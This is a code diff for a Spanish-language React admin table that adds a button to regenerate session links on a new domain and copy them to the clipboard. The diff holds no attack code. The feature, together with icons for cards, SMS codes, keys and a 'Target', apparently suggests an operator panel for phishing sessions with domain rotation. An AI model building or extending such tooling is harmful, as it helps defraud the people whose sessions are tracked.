@@ -8,7 +8,7 @@ import { useToast } from '@/hooks/use-toast';
 import { useDeviceInfo } from '@/hooks/use-device-orientation';
 import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
-import { ArrowRight, Ban, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode } from 'lucide-react';
+import { ArrowRight, Ban, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode, RefreshCw } from 'lucide-react';
 import { DeleteConfirmDialog } from './DeleteConfirmDialog';
 
 interface AccessTableProps {
@@ -78,6 +78,40 @@ const AccessTable: React.FC<AccessTableProps> = ({
     onError: (error) => {
       toast({
         title: "Error al eliminar sesión",
+        description: error.message,
+        variant: "destructive",
+      });
+    }
+  });
+
+  // Mutation para regenerar enlaces con nuevo dominio
+  const regenerateLinkMutation = useMutation({
+    mutationFn: async (sessionId: string) => {
+      const res = await apiRequest('POST', `/api/regenerate-link/${sessionId}`);
+      return await res.json();
+    },
+    onSuccess: (data) => {
+      toast({
+        title: "Enlace regenerado",
+        description: `Enlace actualizado a ${data.newDomain}. El nuevo enlace ha sido copiado al portapapeles.`,
+      });
+      
+      // Copiar el nuevo enlace al portapapeles
+      if (data.link) {
+        navigator.clipboard.writeText(data.link).catch(() => {
+          // Si falla el clipboard, mostrar el enlace
+          toast({
+            title: "Nuevo enlace generado",
+            description: data.link,
+          });
+        });
+      }
+      
+      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
+    },
+    onError: (error) => {
+      toast({
+        title: "Error al regenerar enlace",
         description: error.message,
         variant: "destructive",
       });
@@ -584,6 +618,19 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       )}
                       
                       <Button 
+                        size="sm"
+                        className="bg-[#007700] hover:bg-[#006600] text-white"
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          regenerateLinkMutation.mutate(session.sessionId);
+                        }}
+                        disabled={regenerateLinkMutation.isPending}
+                        title="Regenerar enlace con nuevo dominio"
+                      >
+                        {regenerateLinkMutation.isPending ? '...' : <RefreshCw className="h-4 w-4" />}
+                      </Button>
+                      
+                      <Button 
                         variant="destructive"
                         size="sm"
                         className="flex-1 bg-[#990000] hover:bg-[#800000]"
@@ -743,6 +790,18 @@ const AccessTable: React.FC<AccessTableProps> = ({
                         {saveSessionMutation.isPending ? '...' : 'Guardar'}
                       </Button>
                     )}
+                    <Button 
+                      size="sm"
+                      className="bg-[#007700] hover:bg-[#006600] text-white py-1 h-7 text-xs px-2"
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        regenerateLinkMutation.mutate(session.sessionId);
+                      }}
+                      disabled={regenerateLinkMutation.isPending}
+                      title="Regenerar enlace con nuevo dominio"
+                    >
+                      {regenerateLinkMutation.isPending ? '...' : <RefreshCw className="h-3 w-3" />}
+                    </Button>
                     <Button 
                       variant="destructive"
                       size="sm"
